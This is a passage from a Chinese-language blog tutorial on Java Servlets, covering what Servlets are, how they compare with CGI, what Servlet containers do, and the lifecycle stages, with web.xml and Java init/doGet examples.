          <a href="/2025/10/09/Web%E5%8D%8F%E8%AE%AE%E6%9C%8D%E5%8A%A1%E5%99%A8/JavaServlet/" class="post-title-link" itemprop="url">JavaServlet</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-10-09 21:21:19" itemprop="dateCreated datePublished" datetime="2025-10-09T21:21:19+08:00">2025-10-09</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-10-17 16:07:22" itemprop="dateModified" datetime="2025-10-17T16:07:22+08:00">2025-10-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%99%A8/" itemprop="url" rel="index"><span itemprop="name">Web协议与服务器</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="一、Servlet-基础与核心概念"><a href="#一、Servlet-基础与核心概念" class="headerlink" title="一、Servlet 基础与核心概念"></a>一、Servlet 基础与核心概念</h1><h2 id="1-Servlet-是什么？"><a href="#1-Servlet-是什么？" class="headerlink" title="1. Servlet 是什么？"></a>1. Servlet 是什么？</h2><h3 id="1-1-定义"><a href="#1-1-定义" class="headerlink" title="1.1 定义"></a>1.1 定义</h3><p>Servlet（Server Applet，服务器端小程序）是一种运行在 Web 服务器或应用服务器上的 <strong>Java 程序</strong>。它作为客户端请求（Request）和服务器响应（Response）之间的中间层，用于<strong>生成动态的 Web 内容</strong>。</p>
<p>简单来说，Servlet 就是一个遵循特定规范（Servlet API）的 Java 类，由一个叫做 <strong>“Servlet 容器”</strong>（如 Tomcat）的程序来加载和管理。它的核心职责就是处理客户端发来的请求，并向客户端做出响应。</p>
<p><strong>核心要点:</strong></p>
<ul>
<li><strong>Java 编写：</strong> Servlet 完全使用 Java 语言编写，因此具备 Java 跨平台的特性。</li>
<li><strong>服务器端运行：</strong> 它被部署在 Web 服务器内部，由 Servlet 容器管理其生命周期。</li>
<li><strong>处理请求与响应：</strong> 它的主要工作是接收 HTTP 请求，进行业务逻辑处理（如查询数据库、调用其他服务），然后生成 HTTP 响应（如一个 HTML 页面、JSON 数据）并返回给客户端。</li>
<li><strong>技术规范：</strong> Servlet 是一套标准的 Java API（最初在 <code>javax.servlet</code> 包中，现在是 <code>jakarta.servlet</code> 包），是 Java EE &#x2F; Jakarta EE 规范的核心组成部分，也是构建 Java Web 应用的基石。</li>
</ul>
<hr>
<h3 id="1-2-作用"><a href="#1-2-作用" class="headerlink" title="1.2 作用"></a>1.2 作用</h3><p>Servlet 的核心作用是<strong>充当 Web 客户端和服务器端业务逻辑之间的桥梁</strong>，动态地处理请求并生成响应。它使得开发者能够使用 Java 语言来扩展 Web 服务器的功能。</p>
<p>具体来说，Servlet 的作用可以细分为以下几个方面：</p>
<ol>
<li><strong>接收和解析客户端请求：</strong><ul>
<li>从 HTTP 请求中读取和解析数据，例如：<ul>
<li>用户在表单中提交的数据 (<code>request.getParameter()</code>)。</li>
<li>URL 中的查询字符串。</li>
<li>HTTP 请求头信息（如浏览器类型、Cookie 等）。</li>
</ul>
</li>
</ul>
</li>
<li><strong>处理业务逻辑：</strong><ul>
<li>这是 Servlet 的核心职责。它可以根据接收到的请求数据执行任何 Java 代码可以完成的任务。</li>
<li>例如：验证用户登录、与数据库交互（增删改查）、调用其他服务（如微服务、EJB）、执行复杂的计算等。</li>
</ul>
</li>
<li><strong>生成和发送动态响应：</strong><ul>
<li>根据业务逻辑的处理结果，动态地生成响应内容并将其发送回客户端。</li>
<li>响应内容可以是：<ul>
<li>一个完整的 HTML 页面。</li>
<li>JSON 或 XML 格式的数据（常用于 AJAX 和 RESTful API）。</li>
<li>一个重定向指令，让浏览器跳转到另一个页面。</li>
<li>二进制数据流，如图片、PDF 文件等。</li>
</ul>
</li>
</ul>
</li>
<li><strong>管理会话状态：</strong><ul>
<li>HTTP 协议本身是无状态的。Servlet 通过 <code>HttpSession</code> API 能够在多次请求之间跟踪和维持同一个用户的状态。</li>
<li>例如：实现用户登录状态的保持、维护购物车内容等。</li>
</ul>
</li>
<li><strong>在 MVC 模式中充当控制器 (Controller)：</strong><ul>
<li>在经典的 MVC (Model-View-Controller) 设计模式中，Servlet 扮演着<strong>控制器</strong>的角色。它接收所有用户请求，调用业务逻辑（Model），然后选择合适的视图（View，通常是 JSP）来渲染和展示结果。这是 Java Web 开发中最常见的模式。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="1-3-与-CGI-的对比"><a href="#1-3-与-CGI-的对比" class="headerlink" title="1.3 与 CGI 的对比"></a>1.3 与 CGI 的对比</h3><p>Servlet 的出现主要是为了解决传统 <strong>CGI (Common Gateway Interface, 通用网关接口)</strong> 技术的性能瓶颈问题。CGI 是早期用于在 Web 服务器上执行外部程序以生成动态内容的一种标准。</p>
<table>
<thead>
<tr>
<th>特性 (Feature)</th>
<th>CGI (Common Gateway Interface)</th>
<th>Servlet</th>
</tr>
</thead>
<tbody><tr>
<td><strong>工作模式</strong><br>(Working Model)</td>
<td><strong>多进程模式 (Multi-process)</strong>。<br>每次 HTTP 请求，Web 服务器都会创建一个<strong>全新的独立进程</strong>来执行 CGI 脚本。</td>
<td><strong>多线程模式 (Multi-thread)</strong>。<br>Servlet 实例在容器中<strong>只创建一次</strong>，后续每个请求都由一个<strong>独立的线程</strong>在同一个实例上处理。</td>
</tr>
<tr>
<td><strong>性能与效率</strong><br>(Performance)</td>
<td><strong>低效</strong>。<br>进程的创建和销毁是非常耗时的系统操作，会产生巨大的性能开销。</td>
<td><strong>高效</strong>。<br>线程的创建和切换开销远小于进程。Servlet 实例常驻内存，无需为每个请求重复加载和初始化。</td>
</tr>
<tr>
<td><strong>资源消耗</strong><br>(Resource Usage)</td>
<td><strong>高</strong>。<br>每个请求对应一个进程，会消耗大量的内存和 CPU 资源。</td>
<td><strong>低</strong>。<br>多个线程共享同一个 Servlet 实例的方法区和堆内存，资源利用率极高。</td>
</tr>
<tr>
<td><strong>生命周期</strong><br>(Lifecycle)</td>
<td><strong>请求即生命</strong>。<br>请求处理完毕后，CGI 进程就被销毁，无法维持状态。</td>
<td><strong>长生命周期</strong>。<br>从第一次加载到应用被卸载，Servlet 实例一直存在，可以通过 <code>init()</code> 进行资源初始化，并由容器统一管理。</td>
</tr>
<tr>
<td><strong>可扩展性</strong><br>(Scalability)</td>
<td><strong>差</strong>。<br>当并发请求量增大时，服务器会因创建大量进程而迅速达到资源极限，导致性能急剧下降。</td>
<td><strong>好</strong>。<br>能够轻松地处理成千上万的并发请求，具有优秀的扩展能力。</td>
</tr>
</tbody></table>
<hr>
<h3 id="1-4-Servlet-容器（Web-容器）"><a href="#1-4-Servlet-容器（Web-容器）" class="headerlink" title="1.4 Servlet 容器（Web 容器）"></a>1.4 Servlet 容器（Web 容器）</h3><p><strong>Servlet 容器</strong>，也常被称为 <strong>Web 容器</strong>，是一个提供了 Servlet 运行环境的软件组件。它负责管理 Servlet 的整个生命周期，并处理网络通信的底层细节。</p>
<p>简单来说，<strong>Servlet 只是一个遵循特定接口的 Java 类，它本身并不能独立运行</strong>。它必须被部署到 Servlet 容器中，由容器来加载、实例化、调用和销毁。</p>
<h4 id="1-4-1-核心职责"><a href="#1-4-1-核心职责" class="headerlink" title="1.4.1 核心职责"></a>1.4.1 核心职责</h4><h5 id="1-生命周期管理-Lifecycle-Management"><a href="#1-生命周期管理-Lifecycle-Management" class="headerlink" title="1. 生命周期管理 (Lifecycle Management):"></a>1. 生命周期管理 (Lifecycle Management):</h5><ul>
<li><strong>加载和实例化：</strong> 当容器启动或第一次接收到对某个 Servlet 的请求时，它会加载该 Servlet 类并创建一个实例。</li>
<li><strong>初始化：</strong> 调用 Servlet 实例的 <code>init()</code> 方法进行初始化。</li>
<li><strong>请求处理：</strong> 当请求到来时，调用 Servlet 实例的 <code>service()</code> 方法。</li>
<li><strong>销毁：</strong> 当容器关闭或应用被移除时，调用 Servlet 实例的 <code>destroy()</code> 方法释放资源。</li>
<li><strong>开发者不直接调用这些生命周期方法，而是由容器在特定时机自动调用。</strong></li>
</ul>
<hr>
<h5 id="2-通信支持-Communication-Support"><a href="#2-通信支持-Communication-Support" class="headerlink" title="2. 通信支持 (Communication Support):"></a>2. 通信支持 (Communication Support):</h5><ul>
<li>作为 Web 服务器的一部分或与 Web 服务器集成，负责监听特定的网络端口（如 8080）。</li>
<li>接收客户端（如浏览器）发送的 TCP 连接和 HTTP 请求数据流。</li>
<li>将 Servlet 处理后的结果打包成 HTTP 响应格式，通过网络发送回客户端。</li>
</ul>
<hr>
<h5 id="3-请求解析与封装-Request-Parsing-and-Wrapping"><a href="#3-请求解析与封装-Request-Parsing-and-Wrapping" class="headerlink" title="3. 请求解析与封装 (Request Parsing and Wrapping):"></a>3. 请求解析与封装 (Request Parsing and Wrapping):</h5><ul>
<li>容器会将原始的、基于文本的 HTTP 请求数据流解析成开发者易于使用的对象，即 <code>HttpServletRequest</code>。</li>
<li>同时，它会创建一个空的 <code>HttpServletResponse</code> 对象，供 Servlet 写入响应数据。</li>
<li>这两个对象作为参数传递给 Servlet 的 <code>service()</code> 方法。</li>
</ul>
<hr>
<h5 id="4-多线程管理-Multithreading-Management"><a href="#4-多线程管理-Multithreading-Management" class="headerlink" title="4. 多线程管理 (Multithreading Management):"></a>4. 多线程管理 (Multithreading Management):</h5><ul>
<li>Servlet 默认是<strong>单实例多线程</strong>的。容器接收到多个并发请求时，会为每个请求分配一个线程（通常来自线程池），然后这些线程<strong>共享同一个 Servlet 实例</strong>去执行 <code>service()</code> 方法。</li>
<li>这极大地提高了性能，但也要求开发者必须注意<strong>线程安全</strong>问题。</li>
</ul>
<hr>
<h5 id="5-提供其他-Java-EE-Jakarta-EE-技术支持："><a href="#5-提供其他-Java-EE-Jakarta-EE-技术支持：" class="headerlink" title="5. 提供其他 Java EE &#x2F; Jakarta EE 技术支持："></a>5. 提供其他 Java EE &#x2F; Jakarta EE 技术支持：</h5><ul>
<li>除了 Servlet，容器还负责管理和提供 JSP（JavaServer Pages）、Filter（过滤器）、Listener（监听器）等的运行环境。例如，它负责将 JSP 文件编译成 Servlet。</li>
</ul>
<hr>
<h4 id="1-4-2-简要工作流程"><a href="#1-4-2-简要工作流程" class="headerlink" title="1.4.2 简要工作流程"></a>1.4.2 简要工作流程</h4><pre><code class="highlight mermaid">sequenceDiagram
    %% 1. 客户端发送请求
    Client-&gt;&gt;Container: 1. 发送 HTTP 请求

    %% 2-5. 容器处理请求并调用 Servlet
    activate Container
    Note over Container: 2. 接收到请求
    Note over Container: 3. 根据 URL 在 web.xml/注解中查找 Servlet
    Note over Container: 4. 封装 Request 和 Response 对象
    
    Container-&gt;&gt;ThreadPool: 5a. 从线程池获取线程
    activate ThreadPool
    ThreadPool--&gt;&gt;Container: 返回工作线程
    deactivate ThreadPool
    
    Container-&gt;&gt;Servlet: 5b. 调用 service(request, response)
    activate Servlet

    %% 6. Servlet 执行业务逻辑
    Note right of Servlet: 6. 执行业务逻辑，&lt;br/&gt;并将结果写入 Response 对象
    
    %% 7-8. Servlet 返回，容器发送响应
    Servlet--&gt;&gt;Container: service() 方法执行完毕
    deactivate Servlet
    
    Container-&gt;&gt;ThreadPool: 7. 将线程归还到线程池
    activate ThreadPool
    deactivate ThreadPool
    
    Note over Container: 8a. 从 Response 对象生成 HTTP 响应
    Container--&gt;&gt;Client: 8b. 发送最终的 HTTP 响应
    deactivate Container</code></pre>

<ol>
<li>客户端（浏览器）向服务器发送一个 HTTP 请求。</li>
<li><strong>Servlet 容器</strong>（如 Tomcat）接收到这个请求。</li>
<li>容器根据请求的 URL，在 <code>web.xml</code> 或注解中查找并确定应该由哪个 Servlet 来处理。</li>
<li>容器将原始请求数据封装成 <code>HttpServletRequest</code> 对象，并创建一个 <code>HttpServletResponse</code> 对象。</li>
<li>容器从线程池中获取一个线程，调用目标 Servlet 实例的 <code>service()</code> 方法，并将 request 和 response 对象作为参数传入。</li>
<li>Servlet 在 <code>service()</code> 方法中执行业务逻辑，处理数据，并将结果写入 <code>HttpServletResponse</code> 对象。</li>
<li><code>service()</code> 方法执行完毕后，线程被归还到线程池。</li>
<li>容器从 <code>HttpServletResponse</code> 对象中生成最终的 HTTP 响应，并将其发送回客户端。</li>
</ol>
<hr>
<h4 id="1-4-3-常见的-Servlet-容器"><a href="#1-4-3-常见的-Servlet-容器" class="headerlink" title="1.4.3 常见的 Servlet 容器"></a>1.4.3 常见的 Servlet 容器</h4><ul>
<li><strong>Apache Tomcat:</strong> 最流行、最广泛使用的开源 Servlet&#x2F;JSP 容器，是 Servlet 规范的官方参考实现。</li>
<li><strong>Jetty:</strong> 一个轻量级、高度可嵌入的开源 Servlet 容器。</li>
<li><strong>GlassFish:</strong> Oracle 开发的，Jakarta EE 规范的官方参考实现，是一个完整的应用服务器。</li>
<li><strong>WildFly (原 JBoss):</strong> Red Hat 公司开发的开源应用服务器。</li>
</ul>
<hr>
<h2 id="2-Servlet-生命周期"><a href="#2-Servlet-生命周期" class="headerlink" title="2. Servlet 生命周期"></a>2. Servlet 生命周期</h2><h3 id="2-1-加载与实例化"><a href="#2-1-加载与实例化" class="headerlink" title="2.1 加载与实例化"></a>2.1 加载与实例化</h3><p>这是 Servlet 生命周期的<strong>第一个阶段</strong>。在这个阶段，Servlet 容器会找到 Servlet 对应的 <code>.class</code> 文件，将其加载到 JVM 内存中，并创建一个 Servlet 实例。</p>
<p><strong>核心要点：</strong></p>
<ul>
<li><strong>执行时机：</strong> 加载和实例化的动作<strong>只会发生一次</strong>。</li>
<li><strong>结果：</strong> 在整个 Web 应用的生命周期中，一个 Servlet 类<strong>只有一个实例</strong>存在。这也就是我们常说的 Servlet 是**“单例多线程”**模式。</li>
</ul>
<h4 id="2-1-1-触发时机"><a href="#2-1-1-触发时机" class="headerlink" title="2.1.1 触发时机"></a>2.1.1 触发时机</h4><p>Servlet 容器在何时进行加载和实例化，主要有两种情况：</p>
<ol>
<li><p><strong>第一次被访问时（默认行为）</strong></p>
<ul>
<li>这是容器的默认策略，也称为<strong>延迟加载 (Lazy Loading)</strong>。</li>
<li>当第一个匹配该 Servlet 的 HTTP 请求到来时，容器才会去创建 Servlet 实例。</li>
<li><strong>优点：</strong> 节约服务器资源，如果某个 Servlet 一直未被访问，它就不会被实例化，不会占用内存。</li>
<li><strong>缺点：</strong> 第一个访问该 Servlet 的用户会经历一个明显的延迟，因为容器需要完成加载、实例化和初始化这几个步骤。</li>
</ul>
</li>
<li><p><strong>Web 应用启动时</strong></p>
<ul>
<li><p>我们可以配置 Servlet 在 Web 应用启动时就立即被加载和实例化，也称为<strong>立即加载 (Eager Loading)</strong>。</p>
</li>
<li><p><strong>优点：</strong></p>
<ul>
<li>可以将耗时的初始化工作（如建立数据库连接池、加载配置文件等）在服务器启动时完成，确保第一个用户访问时能获得快速响应。</li>
<li>可以确保某些需要在应用启动时就运行的后台任务或服务能够被正确初始化。</li>
</ul>
</li>
<li><p><strong>配置方式：</strong></p>
<ul>
<li><strong>XML (<code>web.xml</code>)</strong>: 在 <code>&lt;servlet&gt;</code> 标签内配置 <code>&lt;load-on-startup&gt;</code>。</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>myServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.MyServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span> <span class="comment">&lt;!-- 数字越小，优先级越高 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>注解 (<code>@WebServlet</code>)</strong>: 在注解中设置 <code>loadOnStartup</code> 属性。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(urlPatterns = &quot;/myServlet&quot;, loadOnStartup = 1)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意:</strong> <code>&lt;load-on-startup&gt;</code> 的值是一个非负整数。值越小，该 Servlet 的启动优先级越高。如果值为负数或未设置，则采用默认的延迟加载策略。</p>
</blockquote>
</li>
</ul>
</li>
</ol>
<p><strong>过程简述：<strong>Servlet 容器通过 Java 的反射机制，调用 Servlet 类的</strong>公共无参构造方法</strong>来创建实例。因此，我们自定义的 Servlet 必须提供一个公共的无参构造函数（通常我们不写，Java 会提供一个默认的）。</p>
<hr>
<h3 id="2-2-初始化"><a href="#2-2-初始化" class="headerlink" title="2.2 初始化"></a>2.2 初始化</h3><p>这是 Servlet 生命周期的<strong>第二个阶段</strong>，紧跟在加载与实例化之后。在这个阶段，Servlet 容器会调用 Servlet 实例的 <code>init()</code> 方法。</p>
<p><strong>核心要点：</strong></p>
<ul>
<li><strong>执行时机：</strong> 在 Servlet 实例被创建后，<strong>立即执行</strong>，且在 Servlet 的整个生命周期中<strong>只会被执行一次</strong>。</li>
<li><strong>主要目的：</strong> 执行一次性的、耗时的准备工作，为后续处理请求做好准备。</li>
</ul>
<h4 id="2-2-1-init-方法的作用"><a href="#2-2-1-init-方法的作用" class="headerlink" title="2.2.1 init() 方法的作用"></a>2.2.1 <code>init()</code> 方法的作用</h4><p><code>init()</code> 方法就像一个类的构造函数，但它专门为 Servlet 的环境而设计。我们通常会重写此方法来完成以下任务：</p>
<ol>
<li><strong>加载配置文件：</strong> 读取 <code>.properties</code> 或 <code>.xml</code> 等配置文件。</li>
<li><strong>建立数据库连接：</strong> 创建数据库连接或初始化一个数据库连接池。</li>
<li><strong>初始化缓存：</strong> 将一些需要频繁访问但不常变动的数据加载到内存中，形成缓存。</li>
<li><strong>读取“初始化参数”：</strong> 获取在 <code>web.xml</code> 或注解中为该特定 Servlet 配置的参数。</li>
</ol>
<h4 id="2-2-2-init-方法签名"><a href="#2-2-2-init-方法签名" class="headerlink" title="2.2.2 init() 方法签名"></a>2.2.2 <code>init()</code> 方法签名</h4><p><code>init()</code> 方法在 <code>javax.servlet.Servlet</code> 接口中定义，其声明为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>参数 <code>ServletConfig config</code>：</strong><ul>
<li>这是 <code>init()</code> 方法最重要的部分。容器在调用 <code>init()</code> 方法时，会传入一个 <code>ServletConfig</code> 对象。</li>
<li><code>ServletConfig</code> 对象封装了该 Servlet 的配置信息。</li>
<li>通过 <code>ServletConfig</code> 对象，我们可以：<ul>
<li><code>getServletName()</code>: 获取 Servlet 的名称。</li>
<li><code>getServletContext()</code>: 获取代表整个 Web 应用的 <code>ServletContext</code> 对象。</li>
<li><strong><code>getInitParameter(String name)</code></strong>: 获取在部署描述符（<code>web.xml</code>）或注解中配置的<strong>初始化参数</strong>。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="2-2-3-代码示例"><a href="#2-2-3-代码示例" class="headerlink" title="2.2.3 代码示例"></a>2.2.3 代码示例</h4><p>假设我们在 <code>web.xml</code> 中为 Servlet 配置了初始化参数：</p>
<p><strong>web.xml 配置:</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ConfigDemoServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.ConfigDemoServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 定义初始化参数 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>adminEmail<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>admin@example.com<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>Servlet Java 代码:</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConfigDemoServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String servletEncoding; <span class="comment">// 定义一个成员变量来存储配置信息</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="comment">// 1. 【非常重要】调用父类的 init 方法，将 ServletConfig 对象保存起来</span></span><br><span class="line">        <span class="built_in">super</span>.init(config);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 通过 config 对象获取初始化参数</span></span><br><span class="line">        <span class="built_in">this</span>.servletEncoding = config.getInitParameter(<span class="string">&quot;encoding&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">adminEmail</span> <span class="operator">=</span> config.getInitParameter(<span class="string">&quot;adminEmail&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 执行初始化逻辑</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.servletEncoding == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.servletEncoding = <span class="string">&quot;ISO-8859-1&quot;</span>; <span class="comment">// 如果未配置，则使用默认值</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Servlet 初始化完成...&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;编码格式: &quot;</span> + <span class="built_in">this</span>.servletEncoding);</span><br><span class="line">        System.out.println(<span class="string">&quot;管理员邮箱: &quot;</span> + adminEmail);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 在后续处理请求时，就可以使用在 init 方法中初始化的变量</span></span><br><span class="line">        resp.setCharacterEncoding(<span class="built_in">this</span>.servletEncoding);</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;Hello, encoding is set to &quot;</span> + <span class="built_in">this</span>.servletEncoding);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>最佳实践：</strong></p>
<p>当我们重写 <code>init(ServletConfig config)</code> 方法时，<strong>强烈建议在方法的第一行调用 <code>super.init(config);</code></strong>。</p>
<p>这是因为父类 <code>GenericServlet</code> 的 <code>init()</code> 方法会将 <code>ServletConfig</code> 对象保存下来，以便我们后续可以通过 <code>getServletConfig()</code> 或 <code>getServletContext()</code> 等方法来获取它。如果不调用 <code>super.init(config)</code>，后续调用这些方法将会抛出 <code>NullPointerException</code>。</p>
</blockquote>
<hr>
<h3 id="2-3-处理请求"><a href="#2-3-处理请求" class="headerlink" title="2.3 处理请求"></a>2.3 处理请求</h3><p>这是 Servlet 生命周期的<strong>第三个阶段</strong>，也是 Servlet 存在的主要目的。一旦 Servlet 完成了实例化和初始化，它就会处于“就绪”状态，等待并处理来自客户端的请求。</p>
<p><strong>核心要点：</strong></p>
<ul>
<li><strong>执行时机：</strong> <strong>每当</strong>有一个客户端请求与该 Servlet 的 URL 匹配时，容器就会调用其服务方法。这个阶段会<strong>被重复执行无数次</strong>。</li>
<li><strong>核心方法：</strong> <code>service()</code> 方法是所有请求的入口点。</li>
<li><strong>线程模型：</strong> 容器会为每个请求分配一个线程来执行 <code>service()</code> 方法。多个线程会<strong>并发地访问同一个 Servlet 实例</strong>，因此必须注意<strong>线程安全</strong>问题。</li>
</ul>
<h4 id="2-3-1-service-方法"><a href="#2-3-1-service-方法" class="headerlink" title="2.3.1 service() 方法"></a>2.3.1 <code>service()</code> 方法</h4><p><code>Servlet</code> 接口中定义了 <code>service()</code> 方法，它是处理所有请求的起点。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span></span><br><span class="line">        <span class="keyword">throws</span> ServletException, IOException;</span><br></pre></td></tr></table></figure>

<p>然而，在实际开发中，我们通常继承的是 <code>HttpServlet</code>。<code>HttpServlet</code> 对 <code>service()</code> 方法进行了重写，使其能够根据 HTTP 请求的类型（GET, POST, PUT, DELETE 等）来分发请求。</p>
<hr>
<h4 id="2-3-2-HttpServlet-的请求分发机制"><a href="#2-3-2-HttpServlet-的请求分发机制" class="headerlink" title="2.3.2 HttpServlet 的请求分发机制"></a>2.3.2 <code>HttpServlet</code> 的请求分发机制</h4><p><code>HttpServlet</code> 的 <code>service()</code> 方法内部实现了一个<strong>分发器</strong>。其工作流程如下：</p>
<ol>
<li>容器接收到请求，调用 <code>HttpServlet</code> 的 <code>service(HttpServletRequest req, HttpServletResponse res)</code> 方法。</li>
<li><code>service()</code> 方法内部会通过 <code>req.getMethod()</code> 获取请求的类型（例如 “GET” 或 “POST”）。</li>
<li>它会使用一个大的 <code>if-else</code> 或 <code>switch</code> 结构，根据请求类型，调用与之对应的 <code>doXXX()</code> 方法。<ul>
<li>如果请求是 GET，就调 用 <code>doGet(req, res)</code>。</li>
<li>如果请求是 POST，就调用 <code>doPost(req, res)</code>。</li>
<li>以此类推，还有 <code>doPut()</code>, <code>doDelete()</code> 等。</li>
</ul>
</li>
</ol>
<p><strong>这就是为什么我们通常不需要重写 <code>service()</code> 方法，而是去重写 <code>doGet()</code> 或 <code>doPost()</code> 方法。</strong></p>
<hr>
<h4 id="2-3-3-doGet-与-doPost-方法"><a href="#2-3-3-doGet-与-doPost-方法" class="headerlink" title="2.3.3 doGet() 与 doPost() 方法"></a>2.3.3 <code>doGet()</code> 与 <code>doPost()</code> 方法</h4><p>这两个是我们最常重写的方法，用于实现具体的业务逻辑。</p>
<ul>
<li><code>protected void doGet(HttpServletRequest request, HttpServletResponse response)</code><ul>
<li>处理 HTTP GET 请求。GET 请求通常用于从服务器获取数据，例如点击链接、在浏览器地址栏直接输入 URL。</li>
</ul>
</li>
